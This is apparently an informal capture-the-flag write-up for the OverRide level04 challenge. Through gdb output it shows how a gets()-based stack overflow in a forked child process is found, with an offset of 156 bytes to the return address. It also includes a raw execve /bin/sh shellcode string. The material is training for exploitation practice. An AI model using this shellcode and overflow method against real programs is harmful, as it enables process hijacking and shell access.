

```
level04@OverRide:~$ ./level04
Give me some shellcode, k
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
child is exiting...
```
i noticed gets() which is vulnurable to beffetOverflow
```
run

=> 0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    %eax,0xac(%esp)
   
(gdb) ni
0x080486db in main ()
(gdb) Give me some shellcode, k   
   
```
as u see the main parent process jumps directly to the prompt


(gdb) set follow-fork-mode child
```
=> 0x80486d6 <main+14>:	call   0x8048550 <fork@plt>
   0x80486db <main+19>:	mov    %eax,0xac(%esp)
   
   
(gdb) i r
eax            0x0	0

so now we re dealing with a child process
```



=> 0x804875e <main+150>:	call   0x80484b0 <gets@plt>

```
(gdb) run <<< "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1709]
=> 0x6261616f

(gdb) i r $eip
eip            0x6261616f

➜  Desktop cyclic -l 0x6261616f
156

(gdb) run <<<$(python -c 'print "A" * 156 + "BBBB"')
Cannot access memory at address 0x42424242
```

```
(gdb)
=> 0x804875e <main+150>:	call   0x80484b0 <gets@plt>

(gdb) x/60wx $esp
0xffffd650:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd660:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd670:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd680:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x42424242

(gdb) p/d 0xffffd6ec - 0xffffd650
$2 = 156

```






























